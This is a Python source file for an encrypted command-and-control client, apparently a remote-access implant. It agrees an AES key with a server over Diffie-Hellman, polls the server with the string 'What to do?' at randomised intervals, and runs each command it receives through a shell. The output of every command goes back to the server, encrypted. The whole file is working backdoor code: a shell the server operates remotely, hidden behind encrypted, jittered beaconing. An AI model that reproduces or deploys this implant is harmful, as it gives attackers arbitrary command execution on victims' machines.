import socket
import random
import time
import pyDH
from AES import AESCipher
import threading
import subprocess

IP_ADDRESS = '127.0.0.1'
PORT = 4921
RECV_LENGTH = 1024
REQUEST_STRING = "What to do?"


class Client:
    def __init__(self):
        try:
            self.dh = pyDH.DiffieHellman()
            self.private_key = self.dh.get_private_key()
            self.public_key = self.dh.gen_public_key()
            self.shared_key = None
            self.init_shared_key()

        except ValueError as e:
            print("Cannot initialized")
            return

    def init_shared_key(self):
        self.shared_key = self.dh.gen_shared_key(int(self.send_request(str("1 " + str(self.public_key)).encode())))
        threading.Timer(5.0 * 60, self.init_shared_key).start()

    def send_request(self, request):
        try:
            my_socket = socket.socket()
            my_socket.connect((IP_ADDRESS, PORT))
            my_socket.send(request)
            data = my_socket.recv(RECV_LENGTH)
            return bytes(data).decode()
        except ValueError:
            print("The server not available")
            return
        finally:
            my_socket.close()

    def run(self):
        while True:
            cipher = AESCipher(str(self.shared_key))
            data = self.send_request(cipher.encrypt(str("2 " + REQUEST_STRING).encode()))
            if data != b'':
                res = cipher.decrypt(data).decode()
                if res is not None and res != '':
                    print('The server sent: ' + res)
                    if res != 'Thanks':
                        returned_output = '3 '
                        try:
                            returned_output += subprocess.check_output(res, shell=True).decode()
                        except Exception as e:
                            returned_output += str(e)
                        data = self.send_request(cipher.encrypt(returned_output.encode()))
                        print('The server sent: ' + cipher.decrypt(data).decode())

            sleep_rand = random.uniform(1.0, 2.0)
            print("Waiting for {}".format(sleep_rand))
            time.sleep(sleep_rand * 30)


def main():
    client = Client()
    client.run()


if __name__ == "__main__":
    main()
